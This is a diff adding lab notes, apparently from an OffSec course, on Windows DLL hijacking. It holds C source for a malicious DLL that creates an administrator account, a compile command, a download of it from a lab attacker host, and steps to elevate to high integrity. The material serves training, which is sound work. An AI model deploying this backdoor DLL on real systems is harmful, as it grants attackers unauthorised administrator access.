@@ -483,3 +483,147 @@ OS{bda3a494a3aecfa18b14dcf00e35dd79}
 ```
 
 > Answer:  OS{bda3a494a3aecfa18b14dcf00e35dd79}
+
+
+# DLL Hijacking
+
+1. Follow the steps from this section on _CLIENTWK220_ (VM #1) to identify the missing DLL, cross-compile your own DLL, and place it in a directory that it gets executed when the service _BetaService_ is restarted. Obtain code execution, an interactive shell, or access to the GUI and enter the flag, which can be found on the desktop of _daveadmin_.
+
+- Start by enumerating the services and check permissions on these files
+```powershell
+PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {($_.State -like 'Running') -and ($_.PathName -notlike 'C:\windows\system32\*')}
+
+	Name          State   PathName
+	----          -----   --------
+	Apache2.4     Running "C:\xampp\apache\bin\httpd.exe" -k runservice
+	BetaService   Running C:\Users\steve\Documents\BetaServ.exe
+	edgeupdate    Running "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
+	LSM           Running
+	mysql         Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
+	uhssvc        Running "C:\Program Files\Microsoft Update Health Tools\uhssvc.exe"
+	VGAuthService Running "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
+	VMTools       Running "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
+	WinDefend     Running "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MsMpEng.exe"
+```
+
+- Check permissions on the binary file
+```powershell
+PS C:\Users\steve> icacls .\Documents\BetaServ.exe
+	.\Documents\BetaServ.exe NT AUTHORITY\SYSTEM:(F)
+		 BUILTIN\Administrators:(F)
+		 CLIENTWK220\steve:(RX)
+		 CLIENTWK220\offsec:(F)
+```
+
+- Start up Procmon to observe any calls to missing DLLs
+	- (**procmon64.exe** is in the C:\\tools\\procmon\\ directory)
+- Add filter for service
+	- Add > Apply > Ok
+![](procmon_filter.png)
+
+- Restart the service to capture processes
+```powershell
+PS C:\Users\steve> Restart-Service BetaService
+	WARNING: Waiting for service 'BetaService (BetaService)' to start...
+```
+
+> Can add filters to narrow down further:
+	- Operation - Contains - Reg - then - Include
+	- Result - Is - NAME NOT FOUND - then - Include
+
+![](procmon_results.png)
+
+- Reuse the adduser.c code within DLL load case, adding *include* statement for the header file **windows.h**
+```c++
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user dave2 password123! /add");
+  	    i = system ("net localgroup administrators dave2 /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+```
+
+- Cross compile
+```bash
+x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
+```
+
+- Transfer to victim computer and run
+```powershell
+PS C:\Users\steve> cd Documents
+
+PS C:\Users\steve\Documents> iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll
+
+PS C:\Users\steve\Documents> Restart-Service BetaService
+	WARNING: Waiting for service 'BetaService (BetaService)' to start...
+
+# Verify user was added and given Administrator group privs
+PS C:\Users\steve\Documents> net user
+	User accounts for \\CLIENTWK220
+	
+	-------------------------------------------------------------------------------
+	Administrator            BackupAdmin              dave
+	dave2                    daveadmin                DefaultAccount
+...
+
+PS C:\Users\steve\Documents> net localgroup administrators
+	...
+	Administrator
+	BackupAdmin
+	dave2
+	...
+```
+
+- Once done can switch to admin user `dave2` within powershell and elevate powershell prompt to High Mandatory Level
+```powershell
+PS C:\Users\steve\Documents> runAs /user:dave2 powershell.exe
+	Enter the password for dave2:
+	Attempting to start powershell.exe as user "CLIENTWK220\dave2" ...
+
+# In next powershell prompt, verify user, integrity level, and elevate
+PS C:\Windows\system32> whoami
+	clientwk220\dave2
+
+PS C:\Windows\system32> whoami /groups
+	GROUP INFORMATION
+	-----------------
+	
+	Group Name                                                    Type             SID          Attributes                  
+	============================================================= ================ ============ ==================================================
+	...
+	Mandatory Label\Medium Mandatory Level
+
+
+PS C:\Windows\system32> Start-Process powershell.exe -Verb RunAs
+
+# In next powershell prompt, verify integrity level
+PS C:\Windows\system32> whoami /groups
+	GROUP INFORMATION
+	-----------------
+	
+	Group Name                                                    Type             SID          Attributes
+	============================================================= ================ ============ ===============================================================
+	...
+	Mandatory Label\High Mandatory Level
+```
+
+
+# Unquoted Service Paths
